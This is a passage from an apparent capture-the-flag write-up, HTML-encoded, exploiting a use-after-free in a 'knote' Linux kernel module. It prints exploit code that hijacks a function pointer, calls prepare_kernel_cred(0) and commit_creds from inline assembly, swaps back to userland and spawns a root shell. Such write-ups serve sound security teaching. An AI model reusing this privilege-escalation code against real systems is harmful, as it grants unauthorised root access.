 <span class=3D"token class-name">size_t</span> len<span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token class-name">knote_user_t</span> user<span class=3D=
"token punctuation">;</span>
    user<span class=3D"token punctuation">.</span>idx <span class=3D"token =
operator">=3D</span> idx<span class=3D"token punctuation">;</span>
    user<span class=3D"token punctuation">.</span>data <span class=3D"token=
 operator">=3D</span> data<span class=3D"token punctuation">;</span>
    user<span class=3D"token punctuation">.</span>len <span class=3D"token =
operator">=3D</span> len<span class=3D"token punctuation">;</span>

    <span class=3D"token keyword">int</span> retv <span class=3D"token oper=
ator">=3D</span> <span class=3D"token function">ioctl</span><span class=3D"=
token punctuation">(</span>FD_KNOTE<span class=3D"token punctuation">,</spa=
n> cmd<span class=3D"token punctuation">,</span> <span class=3D"token opera=
tor">&amp;</span>user<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"ioctl(fd=3D%d, cmd=3D0x%x, &am=
p;ku=3D%p) -&gt; %d\n"</span><span class=3D"token punctuation">,</span> FD_=
KNOTE<span class=3D"token punctuation">,</span> cmd<span class=3D"token pun=
ctuation">,</span> <span class=3D"token operator">&amp;</span>user<span cla=
ss=3D"token punctuation">,</span> retv<span class=3D"token punctuation">)</=
span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span></=
span></code></pre><figcaption>The contextual part of the exploit</figcaptio=
n></figure><p>After I got all necessary kernel module code, I created the U=
AF code. Please ignore the <code>set_ctx_reg()</code> and <code>&amp;prives=
c_ctx_swp</code> &nbsp;variables. As you can see, we're firstly triggering =
the swap by allocating a knote with an invalid data pointer so that <code>k=
n-&gt;data</code> becomes <code>kn</code>. Then, we're allocating our custo=
m <code>kn</code> by passing it as <code>kn-&gt;data</code>. Please note th=
at I'm using knote index 1, and not 0 to prevent <code>encrypt_func</code> =
from being overwritten in the following code of <code>knote.c</code>:</p><f=
igure class=3D"kg-card kg-code-card"><pre class=3D"line-numbers"><code>swit=
ch(cmd) {
    case KNOTE_CREATE:
		// copy userdata to note data
        knotes[ku.idx]-&gt;data =3D data;
        knotes[ku.idx]-&gt;len =3D ku.len;
        if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EFAULT;
        }
        knotes[ku.idx]-&gt;encrypt_func =3D knote_encrypt;
        knotes[ku.idx]-&gt;decrypt_func =3D knote_decrypt;
}</code></pre><figcaption>The code overwriting <code>encrypt_func</code></f=
igcaption></figure><figure class=3D"kg-card kg-code-card"><pre class=3D"lin=
e-numbers language-c" tabindex=3D"0"><code class=3D"language-c"><span class=
=3D"token macro property"><span class=3D"token directive-hash">#</span><spa=
n class=3D"token directive keyword">include</span> <span class=3D"token str=
ing">&lt;stdlib.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;stdio.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;fcntl.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;sys/ioctl.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;sys/xattr.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;unistd.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">"kpwn.c"</span></span>


<span class=3D"token keyword">int</span> FD_KNOTE<span class=3D"token punct=
uation">;</span>

<span class=3D"token keyword">enum</span> <span class=3D"token class-name">=
knote_ioctl_cmd</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_user_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">void</span> <span class=3D"token function">cm=
d_send</span><span class=3D"token punctuation">(</span><span class=3D"token=
 keyword">unsigned</span> <span class=3D"token keyword">long</span> cmd<spa=
n class=3D"token punctuation">,</span> <span class=3D"token keyword">unsign=
ed</span> <span class=3D"token keyword">long</span> idx<span class=3D"token=
 punctuation">,</span> <span class=3D"token keyword">char</span><span class=
=3D"token operator">*</span> data<span class=3D"token punctuation">,</span>=
 <span class=3D"token class-name">size_t</span> len<span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
	<span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">ma=
in</span><span class=3D"token punctuation">(</span><span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
    FD_KNOTE <span class=3D"token operator">=3D</span> <span class=3D"token=
 function">open</span><span class=3D"token punctuation">(</span><span class=
=3D"token string">"/dev/knote"</span><span class=3D"token punctuation">,</s=
pan> O_RDONLY<span class=3D"token punctuation">)</span><span class=3D"token=
 punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span>FD_KNOTE <span class=3D"token operator">&lt;</span> <span class=
=3D"token number">0</span><span class=3D"token punctuation">)</span>
    <span class=3D"token punctuation">{</span>
        <span class=3D"token function">puts</span><span class=3D"token punc=
tuation">(</span><span class=3D"token string">"main(): open failed"</span><=
span class=3D"token punctuation">)</span><span class=3D"token punctuation">=
;</span>
        <span class=3D"token function">exit</span><span class=3D"token punc=
tuation">(</span><span class=3D"token number">1</span><span class=3D"token =
punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>

    <span class=3D"token comment">/* case KNOTE_CREATE:
     *     char *data =3D kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] =3D kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data =3D data;
     *     knotes[ku.idx]-&gt;len =3D len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len))=20
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func =3D knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func =3D knote_decrypt;
     *
     * doesn't reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] creating note 0: fail pls"</=
span><span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_CREATE<span class=3D"token punctuation">,</span> <sp=
an class=3D"token number">0</span><span class=3D"token punctuation">,</span=
> <span class=3D"token punctuation">(</span><span class=3D"token keyword">v=
oid</span><span class=3D"token operator">*</span><span class=3D"token punct=
uation">)</span><span class=3D"token number">0x1337</span><span class=3D"to=
ken punctuation">,</span> <span class=3D"token number">32</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
=20
    <span class=3D"token function">set_ctx_reg</span><span class=3D"token p=
unctuation">(</span><span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>

    <span class=3D"token class-name">knote_t</span> payload_knote<span clas=
s=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>data <span class=
=3D"token operator">=3D</span> <span class=3D"token string">"idc3"</span><s=
pan class=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>len <span class=
=3D"token operator">=3D</span> <span class=3D"token number">5</span><span c=
lass=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>encrypt_func <sp=
an class=3D"token operator">=3D</span> <span class=3D"token operator">&amp;=
</span>privesc_ctx_swp<span class=3D"token punctuation">;</span>
    payload_knote<span class=3D"token punctuation">.</span>decrypt_func <sp=
an class=3D"token operator">=3D</span> <span class=3D"token operator">&amp;=
</span>privesc_ctx_swp<span class=3D"token punctuation">;</span>

    prepare_kernel_cred <span class=3D"token operator">=3D</span> <span cla=
ss=3D"token number">0xffffffff81053c50</span><span class=3D"token punctuati=
on">;</span>
    commit_creds <span class=3D"token operator">=3D</span> <span class=3D"t=
oken number">0xffffffff81053a30</span><span class=3D"token punctuation">;</=
span>

    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"[*] new knote_t size: %lu\n"</=
span><span class=3D"token punctuation">,</span> <span class=3D"token keywor=
d">sizeof</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken class-name">knote_t</span><span class=3D"token punctuation">)</span><sp=
an class=3D"token punctuation">)</span><span class=3D"token punctuation">;<=
/span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] allocating malicious payload=
 knote"</span><span class=3D"token punctuation">)</span><span class=3D"toke=
n punctuation">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_CREATE<span class=3D"token punctuation">,</span> <sp=
an class=3D"token number">1</span><span class=3D"token punctuation">,</span=
> <span class=3D"token operator">&amp;</span>payload_knote<span class=3D"to=
ken punctuation">,</span> <span class=3D"token number">32</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
   =20
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span><span></span><span></span><span></span><span>=
</span><span></span><span></span><span></span><span></span><span></span><sp=
an></span><span></span><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span><span></span><span></span><span><=
/span><span></span><span></span></span></code></pre><figcaption>The new cod=
e that triggers UAF</figcaption></figure><p>Then, we're triggering the func=
tion call to <code>encrypt_func</code> by using <code>KNOTE_ENCRYPT</code>:=
</p><figure class=3D"kg-card kg-code-card"><pre class=3D"line-numbers langu=
age-c" tabindex=3D"0"><code class=3D"language-c"><span class=3D"token macro=
 property"><span class=3D"token directive-hash">#</span><span class=3D"toke=
n directive keyword">include</span> <span class=3D"token string">&lt;stdlib=
.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;stdio.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;fcntl.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;sys/ioctl.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;sys/xattr.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">&lt;unistd.h&gt;</span></span>
<span class=3D"token macro property"><span class=3D"token directive-hash">#=
</span><span class=3D"token directive keyword">include</span> <span class=
=3D"token string">"kpwn.c"</span></span>


<span class=3D"token keyword">int</span> FD_KNOTE<span class=3D"token punct=
uation">;</span>

<span class=3D"token keyword">enum</span> <span class=3D"token class-name">=
knote_ioctl_cmd</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_user_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">typedef</span> <span class=3D"token keyword">=
struct</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span> <span class=3D"token class-name"=
>knote_t</span><span class=3D"token punctuation">;</span>


<span class=3D"token keyword">void</span> <span class=3D"token function">cm=
d_send</span><span class=3D"token punctuation">(</span><span class=3D"token=
 keyword">unsigned</span> <span class=3D"token keyword">long</span> cmd<spa=
n class=3D"token punctuation">,</span> <span class=3D"token keyword">unsign=
ed</span> <span class=3D"token keyword">long</span> idx<span class=3D"token=
 punctuation">,</span> <span class=3D"token keyword">char</span><span class=
=3D"token operator">*</span> data<span class=3D"token punctuation">,</span>=
 <span class=3D"token class-name">size_t</span> len<span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">ma=
in</span><span class=3D"token punctuation">(</span><span class=3D"token pun=
ctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token comment">// ...</span>
   =20
    <span class=3D"token comment">/* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;=3D 10 || !knotes[ku.idx])=20
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[=
ku.idx]-&gt;len);
     *=20
     * trigger function call to encrypt_fun
     */</span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] calling (hopefully overwrite=
d) encrypt function"</span><span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
    <span class=3D"token function">cmd_send</span><span class=3D"token punc=
tuation">(</span>KNOTE_ENCRYPT<span class=3D"token punctuation">,</span> <s=
pan class=3D"token number">0</span><span class=3D"token punctuation">,</spa=
n> <span class=3D"token string">"idc4"</span><span class=3D"token punctuati=
on">,</span> <span class=3D"token number">5</span><span class=3D"token punc=
tuation">)</span><span class=3D"token punctuation">;</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[-] exploit failed :("</span><sp=
an class=3D"token punctuation">)</span><span class=3D"token punctuation">;<=
/span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span></span></code></pre><figcaption>The code trig=
gering the exploit</figcaption></figure><p>Now, coming back to <code>set_ct=
x_reg()</code> and <code>privesc_ctx_swp()</code>. When we commit the code =
execution attack in the kmodule, we are in <strong>kernel space </strong>wh=
ilst we want to run a shell as <strong>root</strong> in <strong>userland</s=
trong>. In order to get our beloved shell, we need to perform a <strong>con=
text swap</strong> from kernel to userland. Such context swaps happen with =
every system call being made in the kernel so it's very important. In order=
 to keep this write-up relatively short, you can read more about context sw=
apping in <a href=3D"https://medium.com/geekculture/linux-cpu-context-switc=
h-deep-dive-764bfdae4f01">this</a> awesome blogpost by geekculture. </p><p>=
Since these functions are very standard and used in most kernel pwn challen=
ges I made it a header file:</p><figure class=3D"kg-card kg-code-card"><pre=
 class=3D"line-numbers language-c" tabindex=3D"0"><code class=3D"language-c=
"><span class=3D"token keyword">long</span> prepare_kernel_cred <span class=
=3D"token operator">=3D</span> <span class=3D"token number">0xDEADC0D3</spa=
n><span class=3D"token punctuation">;</span>
<span class=3D"token keyword">long</span> commit_creds <span class=3D"token=
 operator">=3D</span> <span class=3D"token number">0xDEADC0DE</span><span c=
lass=3D"token punctuation">;</span>
<span class=3D"token keyword">long</span> _proc_cs<span class=3D"token punc=
tuation">,</span> _proc_ss<span class=3D"token punctuation">,</span> _proc_=
rsp<span class=3D"token punctuation">,</span> _proc_rflags <span class=3D"t=
oken operator">=3D</span> <span class=3D"token number">0</span><span class=
=3D"token punctuation">;</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">se=
t_ctx_reg</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken punctuation">)</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token function">__asm__</span><span class=3D"token punct=
uation">(</span><span class=3D"token string">".intel_syntax noprefix;"</spa=
n>
            <span class=3D"token string">"mov _proc_cs, cs;"</span>
            <span class=3D"token string">"mov _proc_ss, ss;"</span>
            <span class=3D"token string">"mov _proc_rsp, rsp;"</span>
            <span class=3D"token string">"pushf;"</span> <span class=3D"tok=
en comment">// push rflags</span>
            <span class=3D"token string">"pop _proc_rflags;"</span>
            <span class=3D"token string">".att_syntax"</span><span class=3D=
"token punctuation">)</span><span class=3D"token punctuation">;</span>

    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"[+] CS: 0x%lx, SS: 0x%lx, RSP:=
 0x%lx, RFLAGS: 0x%lx\n"</span><span class=3D"token punctuation">,</span> _=
proc_cs<span class=3D"token punctuation">,</span> _proc_ss<span class=3D"to=
ken punctuation">,</span> _proc_rsp<span class=3D"token punctuation">,</spa=
n> _proc_rflags<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
<span class=3D"token punctuation">}</span>


<span class=3D"token keyword">void</span> <span class=3D"token function">sp=
awn_shell</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken punctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[+] Hello Userland!"</span><span=
 class=3D"token punctuation">)</span><span class=3D"token punctuation">;</s=
pan>
    <span class=3D"token keyword">int</span> uid <span class=3D"token opera=
tor">=3D</span> <span class=3D"token function">getuid</span><span class=3D"=
token punctuation">(</span><span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span>uid <span class=3D"token operator">=3D=3D</span> <span class=3D"=
token number">0</span><span class=3D"token punctuation">)</span>
        <span class=3D"token function">printf</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token string">"[+] UID: %d (root poggers)=
\n"</span><span class=3D"token punctuation">,</span> uid<span class=3D"toke=
n punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">else</span> <span class=3D"token punctuat=
ion">{</span>
        <span class=3D"token function">printf</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token string">"[!] UID: %d (epic fail)\n"=
</span><span class=3D"token punctuation">,</span> uid<span class=3D"token p=
unctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] starting shell"</span><span =
class=3D"token punctuation">)</span><span class=3D"token punctuation">;</sp=
an>
    <span class=3D"token function">system</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"/bin/sh"</span><span class=3D"=
token punctuation">)</span><span class=3D"token punctuation">;</span>

    <span class=3D"token function">puts</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token string">"[*] quitting exploit"</span><spa=
n class=3D"token punctuation">)</span><span class=3D"token punctuation">;</=
span>
    <span class=3D"token function">exit</span><span class=3D"token punctuat=
ion">(</span><span class=3D"token number">0</span><span class=3D"token punc=
tuation">)</span><span class=3D"token punctuation">;</span> <span class=3D"=
token comment">// avoid ugly segfault</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">pr=
ivesc_ctx_swp</span><span class=3D"token punctuation">(</span><span class=
=3D"token punctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token function">__asm__</span><span class=3D"token punct=
uation">(</span><span class=3D"token string">".intel_syntax noprefix;"</spa=
n>
            <span class=3D"token comment">/**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be deriv=
ed from that;
             * otherwise they'll be set to 0 and no groups, full capabiliti=
es and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */</span>
            <span class=3D"token string">"xor rdi, rdi;"</span>
            <span class=3D"token string">"movabs rax, prepare_kernel_cred;"=
</span>
            <span class=3D"token string">"call rax;"</span> <span class=3D"=
token comment">// prepare_kernel_cred(0)</span>

            <span class=3D"token comment">/**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */</span>
            <span class=3D"token string">"mov rdi, rax;"</span> <span class=
=3D"token comment">// RAX contains cred pointer</span>
            <span class=3D"token string">"movabs rax, commit_creds;"</span>
            <span class=3D"token string">"call rax;"</span>

            <span class=3D"token comment">// setup the context swapping</sp=
an>
            <span class=3D"token string">"swapgs;"</span> <span class=3D"to=
ken comment">// swap GS to userland</span>

            <span class=3D"token string">"mov r15, _proc_ss;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"mov r15, _proc_rsp;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"mov r15, _proc_rflags;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"mov r15, _proc_cs;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"lea r15, spawn_shell;"</span> <sp=
an class=3D"token comment">// lea rip, spawn_shell ; when returning to user=
land</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"iretq;"</span> <span class=3D"tok=
en comment">// swap context to userland</span>
            <span class=3D"token string">".att_syntax;"</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span><span></span><span></span><span></span><span>=
</span><span></span><span></span><span></span><span></span><span></span><sp=
an></span><span></span><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span></span></code></pre><figcaption>C=
ontent of <code>kpwn.c</code></figcaption></figure><p>Basically in a nutshe=
ll, the context swap requires the registers <code>ss</code>, <code>rsp</cod=
e>, <code>rflags</code> and <code>cs</code> <strong>from userland</strong>,=
 since they are mission critical for returning to userland context. We stor=
e those registers in the <code>set_ctx_reg()</code> function:</p><figure cl=
ass=3D"kg-card kg-code-card"><pre class=3D"line-numbers language-c" tabinde=
x=3D"0"><code class=3D"language-c"><span class=3D"token keyword">long</span=
> _proc_cs<span class=3D"token punctuation">,</span> _proc_ss<span class=3D=
"token punctuation">,</span> _proc_rsp<span class=3D"token punctuation">,</=
span> _proc_rflags <span class=3D"token operator">=3D</span> <span class=3D=
"token number">0</span><span class=3D"token punctuation">;</span>

<span class=3D"token keyword">void</span> <span class=3D"token function">se=
t_ctx_reg</span><span class=3D"token punctuation">(</span><span class=3D"to=
ken punctuation">)</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token function">__asm__</span><span class=3D"token punct=
uation">(</span><span class=3D"token string">".intel_syntax noprefix;"</spa=
n>
            <span class=3D"token string">"mov _proc_cs, cs;"</span>
            <span class=3D"token string">"mov _proc_ss, ss;"</span>
            <span class=3D"token string">"mov _proc_rsp, rsp;"</span>
            <span class=3D"token string">"pushf;"</span> <span class=3D"tok=
en comment">// push rflags</span>
            <span class=3D"token string">"pop _proc_rflags;"</span>
            <span class=3D"token string">".att_syntax"</span><span class=3D=
"token punctuation">)</span><span class=3D"token punctuation">;</span>

    <span class=3D"token function">printf</span><span class=3D"token punctu=
ation">(</span><span class=3D"token string">"[+] CS: 0x%lx, SS: 0x%lx, RSP:=
 0x%lx, RFLAGS: 0x%lx\n"</span><span class=3D"token punctuation">,</span> _=
proc_cs<span class=3D"token punctuation">,</span> _proc_ss<span class=3D"to=
ken punctuation">,</span> _proc_rsp<span class=3D"token punctuation">,</spa=
n> _proc_rflags<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
/span></code></pre><figcaption><code>set_ctx_reg()</code> content</figcapti=
on></figure><p>After we set them, we can use our own privesc and context sw=
ap function which also sets the new userland execution pointer. Keep in min=
d that the following code snippet uses global variables in the assembly. Th=
e code starts off by calling <code>prepare_kernel_cred(0)</code> (which pre=
pares the credentials to be set to UID 0 and GID 0) and then calls <code>co=
mmit_creds(creds)</code> to set the process credentials indefinitely. At la=
st, it prepares the context swap registers and performs the context swap.</=
p><figure class=3D"kg-card kg-code-card"><pre class=3D"line-numbers languag=
e-c" tabindex=3D"0"><code class=3D"language-c"><span class=3D"token keyword=
">void</span> <span class=3D"token function">privesc_ctx_swp</span><span cl=
ass=3D"token punctuation">(</span><span class=3D"token punctuation">)</span=
>
<span class=3D"token punctuation">{</span>
    <span class=3D"token function">__asm__</span><span class=3D"token punct=
uation">(</span><span class=3D"token string">".intel_syntax noprefix;"</spa=
n>
            <span class=3D"token comment">/**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be deriv=
ed from that;
             * otherwise they'll be set to 0 and no groups, full capabiliti=
es and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */</span>
            <span class=3D"token string">"xor rdi, rdi;"</span>
            <span class=3D"token string">"movabs rax, prepare_kernel_cred;"=
</span>
            <span class=3D"token string">"call rax;"</span> <span class=3D"=
token comment">// prepare_kernel_cred(0)</span>

            <span class=3D"token comment">/**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */</span>
            <span class=3D"token string">"mov rdi, rax;"</span> <span class=
=3D"token comment">// RAX contains cred pointer</span>
            <span class=3D"token string">"movabs rax, commit_creds;"</span>
            <span class=3D"token string">"call rax;"</span>

            <span class=3D"token comment">// setup the context swapping</sp=
an>
            <span class=3D"token string">"swapgs;"</span> <span class=3D"to=
ken comment">// swap GS to userland</span>

            <span class=3D"token string">"mov r15, _proc_ss;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"mov r15, _proc_rsp;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"mov r15, _proc_rflags;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"mov r15, _proc_cs;"</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"lea r15, spawn_shell;"</span> <sp=
an class=3D"token comment">// lea rip, spawn_shell ; when returning to user=
land</span>
            <span class=3D"token string">"push r15;"</span>
            <span class=3D"token string">"iretq;"</span> <span class=3D"tok=
en comment">// swap context to userland</span>
            <span class=3D"token string">".att_syntax;"</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span></span></code></pre><figc=
aption>The <code>privesc_ctx_swp()</code> function</figcaption></figure><p>=
This sets the new RIP to <code>spawn_shell</code>, which contains our userl=
and code to spawn a shell:</p><figure class=3D"kg-card kg-code-card"><pre c=
